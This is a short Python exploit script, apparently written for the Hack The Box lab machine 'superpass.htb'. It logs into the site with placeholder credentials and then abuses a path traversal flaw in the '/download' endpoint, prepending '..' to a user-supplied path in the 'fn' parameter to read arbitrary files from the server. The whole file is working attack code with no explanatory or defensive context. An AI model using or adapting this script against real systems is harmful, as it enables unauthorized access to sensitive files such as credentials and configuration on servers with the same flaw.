#!/usr/bin/python3
import requests, sys

if len(sys.argv) < 2:
    print(f"\n\033[0;37m[\033[0;31m-\033[0;37m] Uso: python3 {sys.argv[0]} \n")
    sys.exit(1)

target = "http://superpass.htb"
session = requests.Session()

data = {"username": "username", "password": "password", "submit": ""}
session.post(target + "/account/login", data=data)

params = {"fn": ".." + sys.argv[1]}
request = session.get(target + "/download", params=params)

print(request.text.strip())
